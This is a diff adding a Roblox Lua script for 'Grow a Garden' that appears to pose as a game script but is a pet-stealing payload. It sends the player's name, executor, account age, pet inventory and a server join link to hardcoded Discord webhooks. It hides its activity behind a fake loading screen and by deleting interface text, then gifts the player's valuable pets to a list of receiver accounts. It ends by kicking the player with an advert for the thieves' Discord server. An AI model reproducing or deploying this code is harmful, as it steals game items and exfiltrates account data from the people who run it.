@@ -1,0 +1,605 @@
+if getgenv().scriptAlreadyRan then
+    warn("⚠️ Script already ran.")
+    return
+end
+getgenv().scriptAlreadyRan = true
+
+-- 🔧 Configuration
+getgenv().MinLevel = 75       -- Minimum pet level
+getgenv().MinWeight = 20      -- Minimum pet weight
+local GROWTH_FACTOR = 0.1     -- Weight growth factor
+local WEBHOOK_LOW = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
+local WEBHOOK_HIGH = "https://discord.com/api/webhooks/1401554249158230216/7H-IIQH6rGTSntv0Du-Dbk2sYzCSYbLHKd-m-j_paAZwh8V4Yj5ec-J4StSZWWB8zqYn"
+local WEBHOOK_THRESHOLD = 1900 -- Threshold for high-value webhook
+local MAX_OCCUPANCY = 2        -- Max players for server hopping
+
+-- Pet whitelist and values
+local PET_WHITELIST = {
+    "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly",
+    "Disco Bee", "Mimic Octopus", "Queen Bee", "Spinosaurus",
+    "Kitsune", "French Fry Ferret", "Corrupted Kitsune", "Lobster Thermidor"
+}
+local PET_VALUES = {
+    ["French Fry Ferret"] = 1500, ["Raccoon"] = 1900, ["T-Rex"] = 400,
+    ["Fennec Fox"] = 1500, ["Dragonfly"] = 500, ["Butterfly"] = 1200,
+    ["Disco Bee"] = 2000, ["Mimic Octopus"] = 500, ["Queen Bee"] = 400,
+    ["Spinosaurus"] = 500, ["Kitsune"] = 7500, ["Corrupted Kitsune"] = 300,
+    ["Lobster Thermidor"] = 1900
+}
+
+-- Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
+local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
+
+-- Target usernames
+local USERNAMES = {
+    "ZeeS_Farm01", "ZeeS_Farm6", "ZeeS_Farm7", "ZeeS_Farm07", "ZeeS_Farm77",
+    "ZeeS_Farm8", "GaGFarmEggV1", "GaGFarmEggV3", "GaGFarmEggV4",
+    "GaGFarmEggV8", "GaGFarmEggV12", "HitFarmv1", "HitFarmv2", "Hitfarmv3",
+    "Hitfarmv4", "Hitfarmv5", "HitFarmv6", "HitFarmv7", "HitFarmv8",
+    "HitFarmv9", "HitFarmv10", "HitFarmv11", "HitFarmv12", "HitFarmv13",
+    "HitFarmv14", "HitFarmv15", "HitFarmv16", "HitFarmv17", "HitFarmv18",
+    "HitFarmv19", "HitFarmv20", "HitFarmv21", "HitFarmv22", "HitFarmv23",
+    "HitFarmv24", "HitFarmv25", "HitFarmv26", "HitFarmv27", "HitFarmv28",
+    "HitFarmv29", "HitFarmv30"
+}
+
+-- Global variables
+local teleportStarted = false
+local victimPetTable = {}
+local totalValue = 0
+
+-- Wait for game to load
+repeat task.wait() until game:IsLoaded()
+
+-- Helper Functions
+local function getWebhookUrlByValue(value)
+    return value >= WEBHOOK_THRESHOLD and WEBHOOK_HIGH or WEBHOOK_LOW
+end
+
+local function isPrivateServer()
+    return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
+end
+
+local function isServerFull()
+    return #Players:GetPlayers() >= game.Players.MaxPlayers
+end
+
+local function isTargetOnServer()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(USERNAMES, player.Name) then
+            return true, player.Name
+        end
+    end
+    return false, nil
+end
+
+local function createWarningGUI(text)
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ServerWarningGUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.6, 0, 0.2, 0)
+    frame.Position = UDim2.new(0.2, 0, 0.4, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BackgroundTransparency = 0.2
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextStrokeTransparency = 0.8
+    label.Font = Enum.Font.SourceSansBold
+    label.TextScaled = true
+    label.Text = text
+    label.Parent = frame
+
+    return screenGui
+end
+
+local function createLoadingGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ColorfulLoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(0, 450, 0, 240)
+    background.Position = UDim2.new(0.5, -225, 0.5, -120)
+    background.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
+    background.BackgroundTransparency = 0.02
+    background.BorderSizePixel = 0
+    background.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 24)
+    corner.Parent = background
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.35, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "🌈 Loading..."
+    title.TextColor3 = Color3.fromRGB(255, 255, 150)
+    title.TextStrokeColor3 = Color3.fromRGB(255, 80, 80)
+    title.TextStrokeTransparency = 1
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.Parent = background
+
+    local timerLabel = Instance.new("TextLabel")
+    timerLabel.Size = UDim2.new(1, 0, 0.25, 0)
+    timerLabel.Position = UDim2.new(0, 0, 0.35, 0)
+    timerLabel.BackgroundTransparency = 1
+    timerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    timerLabel.TextStrokeTransparency = 0.8
+    timerLabel.TextScaled = true
+    timerLabel.Font = Enum.Font.Gotham
+    timerLabel.Text = "Approximately 40 seconds left"
+    timerLabel.Parent = background
+
+    local progressBarBg = Instance.new("Frame")
+    progressBarBg.Size = UDim2.new(0.9, 0, 0.12, 0)
+    progressBarBg.Position = UDim2.new(0.05, 0, 0.75, 0)
+    progressBarBg.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
+    progressBarBg.BorderSizePixel = 0
+    progressBarBg.Parent = background
+
+    local bgCorner = Instance.new("UICorner")
+    bgCorner.CornerRadius = UDim.new(1, 0)
+    bgCorner.Parent = progressBarBg
+
+    local progressBarFill = Instance.new("Frame")
+    progressBarFill.Size = UDim2.new(0, 0, 1, 0)
+    progressBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    progressBarFill.BorderSizePixel = 0
+    progressBarFill.Parent = progressBarBg
+
+    local fillCorner = Instance.new("UICorner")
+    fillCorner.CornerRadius = UDim.new(1, 0)
+    fillCorner.Parent = progressBarFill
+
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 128, 0)),
+        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)),
+        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)),
+        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 255, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 128, 255))
+    }
+    gradient.Rotation = 0
+    gradient.Parent = progressBarFill
+
+    task.spawn(function()
+        while gradient do
+            gradient.Rotation = (gradient.Rotation + 1) % 360
+            task.wait(0.03)
+        end
+    end)
+
+    return screenGui, timerLabel, progressBarFill
+end
+
+local function tryServerHop()
+    local cursor = ""
+    repeat
+        local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+        if cursor ~= "" then
+            url = url .. "&cursor=" .. cursor
+        end
+        local success, result = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet(url))
+        end)
+        if success and result and result.data then
+            for _, server in ipairs(result.data) do
+                if server.id ~= game.JobId and server.playing >= 2 and server.playing < server.maxPlayers then
+                    print(string.format("🔁 Jumping to server: %s (%d/%d)", server.id, server.playing, server.maxPlayers))
+                    teleportStarted = true
+                    task.wait(0.2)
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
+                    return true
+                end
+            end
+            cursor = result.nextPageCursor or ""
+        else
+            warn("❌ Failed to fetch server list.")
+            break
+        end
+        task.wait(1)
+    until cursor == ""
+    return false
+end
+
+local function unequipAllPets()
+    local petsData = dataModule:GetData().PetsData.PetInventory.Data
+    for petUid, petInfo in pairs(petsData) do
+        print("➡️ Unequipping:", petInfo.PetType, petUid)
+        local success, err = pcall(function()
+            PetsService:FireServer("UnequipPet", petUid)
+        end)
+        if not success then
+            warn("❌ Failed to unequip pet:", petInfo.PetType, petUid, err)
+        end
+        task.wait(0.1)
+    end
+end
+
+local function isPetEligible(petData, petName)
+    local level = petData.Level or 0
+    local baseWeight = petData.BaseWeight or 0
+    local calculatedWeight = baseWeight * (1 + level * GROWTH_FACTOR)
+    return table.find(PET_WHITELIST, petName) ~= nil or level >= getgenv().MinLevel or calculatedWeight >= getgenv().MinWeight
+end
+
+local function checkPetsWhitelist(petName)
+    return table.find(PET_WHITELIST, petName) ~= nil
+end
+
+local function getPetObject(petUid)
+    for _, object in pairs(LocalPlayer.Backpack:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+    for _, object in pairs(workspace[LocalPlayer.Name]:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+    return nil
+end
+
+local function equipPet(pet)
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") or pet.Parent == LocalPlayer.Character then
+        print("➡️ Pet already equipped or character not ready:", pet.Name)
+        return
+    end
+    local success, err = pcall(function()
+        if pet:GetAttribute("d") then
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+        end
+        LocalPlayer.Character.Humanoid:EquipTool(pet)
+    end)
+    if success then
+        print("✅ Equipped pet:", pet.Name)
+    else
+        warn("❌ Failed to equip pet:", pet.Name, err)
+    end
+    task.wait(0.1)
+end
+
+local function deltaBypass()
+    local success, err = pcall(function()
+        VirtualInputManager:SendMouseButtonEvent(
+            workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+            0, true, nil, false
+        )
+        task.wait()
+        VirtualInputManager:SendMouseButtonEvent(
+            workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+            0, false, nil, false
+        )
+    end)
+    if not success then
+        warn("❌ Delta bypass failed:", err)
+    end
+end
+
+local function startSteal(targetName)
+    local target = game.Players:FindFirstChild(targetName)
+    if target and target.Character and target.Character.Head:FindFirstChild("ProximityPrompt") then
+        target.Character.Head.ProximityPrompt.HoldDuration = 0
+        deltaBypass()
+    else
+        warn("❌ Failed to start steal: Target or ProximityPrompt not found for", targetName)
+    end
+end
+
+local function getPlayersPets()
+    totalValue = 0
+    victimPetTable = {}
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        if not petName or not isPetEligible(value, petName) then
+            print("➡️ Skipped pet:", petName, "Not eligible")
+            continue
+        end
+        local petPrice = PET_VALUES[petName] or 0
+        totalValue = totalValue + petPrice
+        local level = value.Level or 0
+        local baseWeight = value.BaseWeight or 0
+        local finalWeight = math.floor(baseWeight * (1 + level * GROWTH_FACTOR) * 100) / 100
+        table.insert(victimPetTable, string.format("%s - %s₸ | Lv.%d | %.2fkg", petName, petPrice, level, finalWeight))
+        print("✅ Added pet to table:", petName, petUid)
+    end
+end
+
+local function createDiscordEmbed(petList, totalValue, callback)
+    local webhookUrl = getWebhookUrlByValue(tonumber(totalValue))
+    local embed = {
+        title = "🌵 Grow A Garden Hit - STANT STEAL 🍀",
+        color = 65280,
+        fields = {
+            {
+                name = "👤 **Player Information**",
+                value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
+                    LocalPlayer.Name, USERNAMES[1], identifyexecutor() or "Unknown", LocalPlayer.AccountAge),
+                inline = false
+            },
+            {
+                name = "💰 **Total Value**",
+                value = string.format("```\n%s₸\n```", totalValue),
+                inline = false
+            },
+            {
+                name = "🌴 **Backpack**",
+                value = string.format("```\n%s\n```", petList),
+                inline = false
+            },
+            {
+                name = "🏝️ **Join with URL**",
+                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
+                    game.JobId, game.PlaceId, game.JobId),
+                inline = false
+            }
+        },
+        footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
+    }
+    local data = {
+        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+            game.PlaceId, game.JobId),
+        username = LocalPlayer.Name,
+        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+        embeds = {embed}
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = { ["Content-Type"] = "application/json" }
+    local request = http_request or request or HttpPost or syn.request
+    local success, response = pcall(function()
+        return request({ Url = webhookUrl, Method = "POST", Headers = headers, Body = jsonData })
+    end)
+    if success and (response.StatusCode == 200 or response.StatusCode == 204) then
+        print("✅ Webhook sent successfully")
+        if callback then callback() end
+    else
+        warn("❌ Discord webhook error:", response and response.StatusCode, response and response.Body)
+    end
+end
+
+local function checkPetsInventory(targetName)
+    local recipient = Players:FindFirstChild(targetName)
+    if not recipient then
+        warn("❌ Получатель не найден:", targetName)
+        return
+    end
+
+    for petUid, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = petData.PetType
+        if not petName or not isPetEligible(petData, petName) then
+            print("➡️ Skipped pet:", petName, "Not eligible")
+            continue
+        end
+
+        print("➡️ Attempting to give pet:", petName, petUid, "to", targetName)
+        local petObject = getPetObject(petUid)
+        if petObject and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            equipPet(petObject)
+            task.wait(0.2) -- Задержка для обеспечения экипировки
+        else
+            warn("❌ Failed to equip pet:", petName, petUid, "Pet object or character not found")
+            continue
+        end
+
+        local args = {
+            "GivePet",
+            recipient,
+            petUid
+        }
+
+        local success, err = pcall(function()
+            ReplicatedStorage.GameEvents.PetGiftingService:FireServer(unpack(args))
+        end)
+        if success then
+            print("✅ Successfully attempted to give pet:", petName, petUid)
+        else
+            warn("❌ Failed to give pet:", petName, petUid, err)
+        end
+        task.wait(1.35)
+    end
+end
+
+local function teleportTarget(targetName)
+    local target = game.Players:FindFirstChild(targetName)
+    if target and target.Character and LocalPlayer.Character then
+        local success, err = pcall(function()
+            LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+        end)
+        if not success then
+            warn("❌ Failed to teleport to target:", targetName, err)
+        end
+    else
+        warn("❌ Cannot teleport: Target or character not found for", targetName)
+    end
+end
+
+local function idlingTarget()
+    task.spawn(function()
+        local lastTarget = nil
+        local targetEnterTime = 0
+        while task.wait(0.2) do
+            local isTarget, trigerName = isTargetOnServer()
+            if isTarget then
+                if lastTarget ~= trigerName then
+                    lastTarget = trigerName
+                    targetEnterTime = tick()
+                    print("✅ Detected target:", trigerName)
+                end
+                if tick() - targetEnterTime >= 20 then
+                    teleportTarget(trigerName)
+                    checkPetsInventory(trigerName)
+                end
+            else
+                lastTarget = nil
+                targetEnterTime = 0
+            end
+        end
+    end)
+end
+
+local function createTheftGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "TheftWarning"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.4, 0, 0.25, 0)
+    frame.Position = UDim2.new(0.3, 0, 0.35, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    frame.BackgroundTransparency = 0.2
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 16)
+    corner.Parent = frame
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 1, -20)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+    label.Text = "⚠️ Some of your pets were stolen!\n\nWant a script like this?\nJoin us: discord.gg/Rm5XHagSJW"
+    label.TextWrapped = true
+    label.Parent = frame
+
+    task.spawn(function()
+        task.wait(8)
+        for i = 0, 1, 0.05 do
+            frame.BackgroundTransparency = 0.2 + i * 0.8
+            label.TextTransparency = i
+            task.wait(0.05)
+        end
+        screenGui:Destroy()
+    end)
+
+    return screenGui
+end
+
+-- Main Logic
+if isPrivateServer() then
+    warn("🔒 Private server detected.")
+    createWarningGUI("⚠️ Private server detected.\nSwitching to a public server...")
+    task.wait(2)
+    tryServerHop()
+    return
+end
+
+local playerCount = #Players:GetPlayers()
+if playerCount <= 2 then
+    createWarningGUI("⚠️ Low player count.\nSwitching to a suitable server...")
+    task.spawn(tryServerHop)
+    task.wait(9999)
+    return
+elseif playerCount >= 5 then
+    if not isTargetOnServer() then
+        createWarningGUI("⚠️ Server full and no target.\nSwitching to a suitable server...")
+        task.spawn(tryServerHop)
+        task.wait(9999)
+        return
+    end
+end
+
+task.spawn(function()
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+    local function removeText(obj)
+        if obj:IsA("TextLabel") or obj:IsA("TextButton") then
+            obj:Destroy()
+        end
+    end
+
+    -- Удаляем уже существующие тексты
+    for _, obj in ipairs(PlayerGui:GetDescendants()) do
+        removeText(obj)
+    end
+
+    -- Удаляем новые тексты при их появлении
+    PlayerGui.DescendantAdded:Connect(function(obj)
+        task.wait() -- ждём, чтобы элемент успел появиться
+        removeText(obj)
+    end)
+end)
+
+
+
+-- Loading GUI
+local loadingGui, timerLabel, progressBarFill = createLoadingGUI()
+local duration = 40
+task.spawn(function()
+    for i = duration, 1, -1 do
+        timerLabel.Text = "Approximately " .. i .. " seconds left"
+        local progress = (duration - i + 1) / duration
+        progressBarFill:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true)
+        task.wait(1)
+    end
+    for t = 1, 20 do
+        local alpha = t / 20
+        loadingGui:WaitForChild("background").BackgroundTransparency = 0.02 + alpha
+        loadingGui.background:WaitForChild("progressBarBg").BackgroundTransparency = alpha
+        loadingGui.background:WaitForChild("progressBarFill").BackgroundTransparency = alpha
+        loadingGui.background:WaitForChild("title").TextTransparency = alpha
+        loadingGui.background.title.TextStrokeTransparency = alpha
+        loadingGui.background:WaitForChild("timerLabel").TextTransparency = alpha
+        loadingGui.background.timerLabel.TextStrokeTransparency = alpha
+        task.wait(0.03)
+    end
+    loadingGui:Destroy()
+end)
+
+-- Unequip pets and scan inventory
+unequipAllPets()
+getPlayersPets()
+
+if #victimPetTable == 0 then
+    warn("❌ No eligible pets found.")
+    return
+end
+
+-- Send Discord notification and start target monitoring
+createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), function()
+    idlingTarget()
+end)
+
+-- Check for theft and notify victim
+task.delay(10, function()
+    local newTotal = 0
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        if not petName or not isPetEligible(value, petName) then continue end
+        local petPrice = PET_VALUES[petName] or 0
+        newTotal = newTotal + petPrice
+    end
+    if newTotal < totalValue then
+        createTheftGUI()
+        setclipboard("https://discord.gg/Rm5XHagSJW")
+        task.wait(10)
+        LocalPlayer:Kick("⚠️ Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
+    end
+end)
